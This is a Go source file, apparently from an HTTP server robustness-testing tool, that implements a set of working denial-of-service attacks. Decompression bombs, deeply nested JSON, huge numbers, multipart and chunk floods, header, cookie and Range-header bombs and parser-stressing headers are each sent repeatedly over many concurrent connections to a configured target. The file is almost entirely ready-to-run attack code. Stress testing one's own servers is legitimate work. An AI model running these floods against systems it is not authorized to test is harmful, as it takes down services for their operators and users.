package main

// HTTP/1.1 payload / parser-differential attacks. Each builds one crafted request
// and floods it on N connections; the pressure is what the SERVER does parsing it
// (decompress, hash, recurse, allocate), so these bite only a server that parses
// that body/header. The parser attacks that need a body-parsing endpoint probe
// /parse first and report no-endpoint (not a false "survived") when it's absent.
// Ports of attack.py's _h1_request_flood family — goroutine-backed so they scale
// past the Python thread-per-connection ceiling.

import (
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// gzipBomb / zlibBomb return a compressed stream (a few MB) that inflates to
// `size` zero bytes. Built streaming so the client never holds the inflated form.
func gzipBomb(size int) []byte {
	var buf bytes.Buffer
	w, _ := gzip.NewWriterLevel(&buf, 6)
	zeros := make([]byte, 1<<20)
	for rem := size; rem > 0; {
		n := len(zeros)
		if n > rem {
			n = rem
		}
		w.Write(zeros[:n])
		rem -= n
	}
	w.Close()
	return buf.Bytes()
}

func zlibBomb(size int) []byte {
	var buf bytes.Buffer
	w, _ := zlib.NewWriterLevel(&buf, 6)
	zeros := make([]byte, 1<<20)
	for rem := size; rem > 0; {
		n := len(zeros)
		if n > rem {
			n = rem
		}
		w.Write(zeros[:n])
		rem -= n
	}
	w.Close()
	return buf.Bytes()
}

// endpointPresent probes `path` with a tiny POST; false if the server answers
// 404/405/501 (doesn't implement it). Any other status / unreadable probe = present.
func endpointPresent(c *config, path string) bool {
	conn, err := dial(c, "http/1.1")
	if err != nil {
		return true // assume present; the attack's server-side signal decides
	}
	defer conn.Close()
	body := []byte("a=1")
	req := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n", path, c.host, len(body))
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write(append([]byte(req), body...)); err != nil {
		return true
	}
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	head := make([]byte, 64)
	n, _ := conn.Read(head)
	parts := strings.SplitN(string(head[:n]), " ", 3)
	if len(parts) > 1 {
		if code, e := strconv.Atoi(parts[1]); e == nil {
			return code != 404 && code != 405 && code != 501
		}
	}
	return true
}

// h1RequestFlood: N connections each send one fixed request repeatedly until the
// deadline (frames_sent = requests). A write/read timeout = the server is slow but
// alive (keep going); any other error = reaped. A requireEndpoint that is absent
// reports no-endpoint instead of a meaningless "survived".
func h1RequestFlood(c *config, st *stats, req []byte, requireEndpoint string) {
	if requireEndpoint != "" && !endpointPresent(c, requireEndpoint) {
		st.EndpointMissing = true
		return
	}
	alpn := h1ALPN(c)
	deadline := time.Now().Add(c.duration)
	var wg sync.WaitGroup
	for i := 0; i < c.conns; i++ {
		if time.Now().After(deadline) {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := dial(c, alpn)
			if err != nil {
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			defer conn.Close()
			atomic.AddInt64(&st.Established, 1)
			ct := counter{st: st}
			defer ct.done()
			rbuf := make([]byte, 65536)
			for time.Now().Before(deadline) {
				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
				if _, err := conn.Write(req); err != nil {
					if isTimeout(err) {
						continue
					}
					atomic.AddInt64(&st.Reaped, 1)
					return
				}
				ct.tally(1, int64(len(req)))
				conn.SetReadDeadline(time.Now().Add(5 * time.Second))
				if _, err := conn.Read(rbuf); err != nil {
					if isTimeout(err) {
						continue
					}
					atomic.AddInt64(&st.Reaped, 1)
					return
				}
			}
		}()
	}
	wg.Wait()
}

func post(c *config, extraHeaders string, body []byte) []byte {
	req := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n%sContent-Length: %d\r\n\r\n",
		c.path, c.host, extraHeaders, len(body))
	return append([]byte(req), body...)
}

func decompressionBomb(c *config, st *stats) {
	bomb := gzipBomb(c.bombSize)
	req := post(c, "Content-Encoding: gzip\r\nContent-Type: application/octet-stream\r\n", bomb)
	h1RequestFlood(c, st, req, c.path)
}

func decompCodecBypass(c *config, st *stats) {
	bomb := zlibBomb(c.bombSize)
	req := post(c, "Content-Encoding: deflate\r\nContent-Type: application/octet-stream\r\n", bomb)
	h1RequestFlood(c, st, req, c.path)
}

func hashdos(c *config, st *stats) {
	var b bytes.Buffer
	for i := 0; i < c.hashdosKeys; i++ {
		if i > 0 {
			b.WriteByte('&')
		}
		fmt.Fprintf(&b, "k%d=1", i)
	}
	h1RequestFlood(c, st, post(c, "Content-Type: application/x-www-form-urlencoded\r\n", b.Bytes()), c.path)
}

func jsonNestingBomb(c *config, st *stats) {
	body := append(bytes.Repeat([]byte("["), c.jsonDepth), bytes.Repeat([]byte("]"), c.jsonDepth)...)
	h1RequestFlood(c, st, post(c, "Content-Type: application/json\r\n", body), c.path)
}

func jsonBignum(c *config, st *stats) {
	body := append(append([]byte(`{"n":`), bytes.Repeat([]byte("9"), c.bignumDigits)...), '}')
	h1RequestFlood(c, st, post(c, "Content-Type: application/json\r\n", body), c.path)
}

func multipartFlood(c *config, st *stats) {
	boundary := "----httparenaResBomb"
	part := []byte("--" + boundary + "\r\nContent-Disposition: form-data; name=\"f\"\r\n\r\nx\r\n")
	var b bytes.Buffer
	for i := 0; i < c.multipartParts; i++ {
		b.Write(part)
	}
	b.WriteString("--" + boundary + "--\r\n")
	h1RequestFlood(c, st, post(c, "Content-Type: multipart/form-data; boundary="+boundary+"\r\n", b.Bytes()), c.path)
}

func redosHeaders(c *config, st *stats) {
	run := strings.Repeat("a", c.redosPad)
	nr := c.redosPad / 4
	if nr < 1 {
		nr = 1
	}
	var rng bytes.Buffer
	for i := 0; i < nr; i++ {
		if i > 0 {
			rng.WriteByte(',')
		}
		rng.WriteString("0-0")
	}
	// filename=" is left unterminated on purpose (stresses the header parser).
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,%s ;q=0\r\n"+
		"Content-Disposition: form-data; name=\"x\"; filename=\"%s\r\nRange: bytes=%s\r\nConnection: keep-alive\r\n\r\n",
		c.path, c.host, run, run, rng.String())
	h1RequestFlood(c, st, []byte(req), "")
}

func tinyChunkFlood(c *config, st *stats) {
	var b bytes.Buffer
	b.WriteString(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n", c.path, c.host))
	for i := 0; i < c.chunkCount; i++ {
		b.WriteString("1\r\nA\r\n")
	}
	b.WriteString("0\r\n\r\n")
	h1RequestFlood(c, st, b.Bytes(), "")
}

func headerBomb(c *config, st *stats) {
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nX-Pad: %s\r\n\r\n", c.path, c.host, strings.Repeat("a", c.headerValueSize))
	h1RequestFlood(c, st, []byte(req), "")
}

func headerCountFlood(c *config, st *stats) {
	var b bytes.Buffer
	fmt.Fprintf(&b, "GET %s HTTP/1.1\r\nHost: %s\r\n", c.path, c.host)
	for i := 0; i < c.headerCount; i++ {
		fmt.Fprintf(&b, "X-%x: a\r\n", i)
	}
	b.WriteString("\r\n")
	h1RequestFlood(c, st, b.Bytes(), "")
}

func duplicateHeaderMerge(c *config, st *stats) {
	var b bytes.Buffer
	fmt.Fprintf(&b, "GET %s HTTP/1.1\r\nHost: %s\r\n", c.path, c.host)
	for i := 0; i < c.dupHeaders; i++ {
		b.WriteString("X-Dup: a\r\n")
	}
	b.WriteString("\r\n")
	h1RequestFlood(c, st, b.Bytes(), "")
}

func qvalueCPUBomb(c *config, st *stats) {
	var al bytes.Buffer
	for i := 0; i < c.qvalueCount; i++ {
		if i > 0 {
			al.WriteByte(',')
		}
		fmt.Fprintf(&al, "en-%x;q=0.%d", i, i%10)
	}
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nAccept-Language: %s\r\n\r\n", c.path, c.host, al.String())
	h1RequestFlood(c, st, []byte(req), "")
}

func cookieFlood(c *config, st *stats) {
	var ck bytes.Buffer
	for i := 0; i < c.cookiePairs; i++ {
		if i > 0 {
			ck.WriteByte(';')
		}
		fmt.Fprintf(&ck, "a%x=1", i)
	}
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nCookie: %s\r\n\r\n", c.path, c.host, ck.String())
	h1RequestFlood(c, st, []byte(req), "")
}

func percentDecodeQuadratic(c *config, st *stats) {
	path := "/" + strings.Repeat("%41", c.percentCount)
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, c.host)
	h1RequestFlood(c, st, []byte(req), "")
}

func rangeBomb(c *config, st *stats) {
	var rng bytes.Buffer
	rng.WriteString("bytes=")
	for i := 0; i < c.rangeCount; i++ {
		if i > 0 {
			rng.WriteByte(',')
		}
		fmt.Fprintf(&rng, "0-%d", i)
	}
	req := fmt.Sprintf("GET /static/reset.css HTTP/1.1\r\nHost: %s\r\nRange: %s\r\n\r\n", c.host, rng.String())
	h1RequestFlood(c, st, []byte(req), "")
}
